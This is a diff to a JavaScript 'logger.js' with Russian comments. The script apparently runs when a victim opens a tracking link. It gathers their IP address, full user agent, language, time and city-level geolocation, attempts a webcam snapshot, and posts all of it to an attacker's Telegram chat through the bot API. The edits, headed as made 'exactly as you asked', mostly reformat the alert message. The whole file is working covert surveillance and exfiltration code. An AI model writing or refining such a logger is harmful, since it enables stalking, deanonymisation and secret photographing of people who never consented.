@@ -1,4 +1,4 @@
-// logger.js — ИСПРАВЛЕННАЯ ВЕРСИЯ
+// logger.js — ТОЧНАЯ СТРУКТУРА КАК ТЫ ПРОСИЛ
 (async function() {
     "use strict";
 
@@ -27,51 +27,22 @@
     const now = new Date();
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
 
-    // ========== 3. UserAgent и язык ==========
-    const userAgent = navigator.userAgent;
+    // ========== 3. UserAgent ПОЛНЫЙ ==========
+    const fullUserAgent = navigator.userAgent;
     const language = navigator.language || "не определён";
-    
-    let deviceType = "не определён";
-    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-        deviceType = "Телефон";
-    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
-        deviceType = "Компьютер";
-    }
 
-    // ОС
-    let os = "не определена";
-    if (userAgent.includes("Windows")) os = "Windows";
-    else if (userAgent.includes("Android")) os = "Android";
-    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
-    else if (userAgent.includes("Mac")) os = "MacOS";
-    else if (userAgent.includes("Linux")) os = "Linux";
+    // ========== 4. Формирование сообщения (ТОЧНАЯ СТРУКТУРА) ==========
+    const message = `🚨 <b>НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ!</b>
 
-    // Браузер
-    let browser = "не определён";
-    if (userAgent.includes("Chrome")) browser = "Chrome";
-    else if (userAgent.includes("Firefox")) browser = "Firefox";
-    else if (userAgent.includes("Safari")) browser = "Safari";
-    else if (userAgent.includes("Edge")) browser = "Edge";
-    else if (userAgent.includes("Opera")) browser = "Opera";
+<b>🌐 IP:</b> <code>${ipAddress}</code>
+<b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
+<b>├─ Язык:</b> <code>${language}</code>
+<b>└─ Время:</b> <code>${timeStr}</code>
 
-    // Краткий UserAgent
-    let shortUA = userAgent;
-    if (userAgent.length > 80) {
-        shortUA = userAgent.substring(0, 77) + "...";
-    }
-
-    // ========== 4. Формирование сообщения (БЕЗ КООРДИНАТ, ССЫЛКИ, РЕФЕРЕРА, FOXLOGGER) ==========
-    const caption = `🚨 НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ!
-
-🌐 IP: ${ipAddress}
- ├─User-Agent: ${deviceType} | ${browser} | ${os}
- ├─Язык: ${language}
- └─Время: ${timeStr}
-
-🌍 Геолокация:
- ├─Страна: ${country}
- ├─Регион: ${region}
- └─Город: ${city}`;
+<b>🌍 Геолокация:</b>
+<b>├─ Страна:</b> <code>${country}</code>
+<b>├─ Регион:</b> <code>${region}</code>
+<b>└─ Город:</b> <code>${city}</code>`;
 
     // ========== 5. Захват фото с вебкамеры ==========
     let photoBlob = null;
@@ -115,6 +86,7 @@
         formData.append("chat_id", TELEGRAM_CHAT_ID);
         formData.append("photo", blob, "webcam_snapshot.jpg");
         formData.append("caption", captionText);
+        formData.append("parse_mode", "HTML");
 
         const response = await fetch(url, { method: "POST", body: formData });
         return response.json();
@@ -128,6 +100,7 @@
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: text,
+                parse_mode: "HTML",
                 disable_web_page_preview: true
             })
         });
@@ -136,15 +109,15 @@
 
     // Отправляем
     if (photoBlob) {
-        const result = await sendPhotoWithCaption(photoBlob, caption);
+        const result = await sendPhotoWithCaption(photoBlob, message);
         if (result.ok) {
             console.log("✅ Фото и данные отправлены");
         } else {
             console.log("❌ Ошибка отправки фото, отправляем текст");
-            await sendTextOnly(caption);
+            await sendTextOnly(message);
         }
     } else {
-        await sendTextOnly(caption);
+        await sendTextOnly(message);
         console.log("✅ Текст отправлен (камера недоступна)");
     }
 })();
